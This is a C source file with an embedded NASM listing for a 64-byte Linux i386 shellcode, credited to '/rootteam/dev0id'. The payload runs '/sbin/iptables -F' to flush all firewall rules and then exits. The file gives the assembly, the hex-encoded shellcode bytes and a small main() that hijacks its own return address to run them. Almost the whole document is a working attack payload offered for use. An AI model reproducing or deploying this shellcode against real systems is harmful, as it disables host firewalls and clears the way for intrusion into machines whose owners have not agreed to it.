/* The shellcode flushs the iptables  by running /sbin/iptables -F
   then exit()
   greetz to zilion: man, my code is shorter!

   size = 64 bytes
   OS	= Linux i386
 		written by /rootteam/dev0id (rootteam.void.ru)


BITS	32

jmp	short	callme
main:
	pop	esi
	xor	eax,eax
	mov byte [esi+14],al
	mov byte [esi+17],al
	mov long [esi+18],esi
	lea	 ebx,[esi+15]
	mov long [esi+22],ebx
	mov long [esi+26],eax
	mov 	al,0x0b
	mov	ebx,esi
	lea	ecx,[esi+18]
	lea	edx,[esi+26]
	int	0x80
	mov	al,0x01
	xor	ebx,ebx
	int	0x80


callme:
	call	main
	db '/sbin/iptables#-F#'
*/


char shellcode[] =
	"\xeb\x27\x5e\x31\xc0\x88\x46\x0e\x88\x46\x11\x89\x76\x12\x8d"
	"\x5e\x0f\x89\x5e\x16\x89\x46\x1a\xb0\x0b\x89\xf3\x8d\x4e\x12"
	"\x8d\x56\x1a\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xd4\xff\xff"
	"\xff\x2f\x73\x62\x69\x6e\x2f\x69\x70\x74\x61\x62\x6c\x65\x73"
	"\x23\x2d\x46\x23";


int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}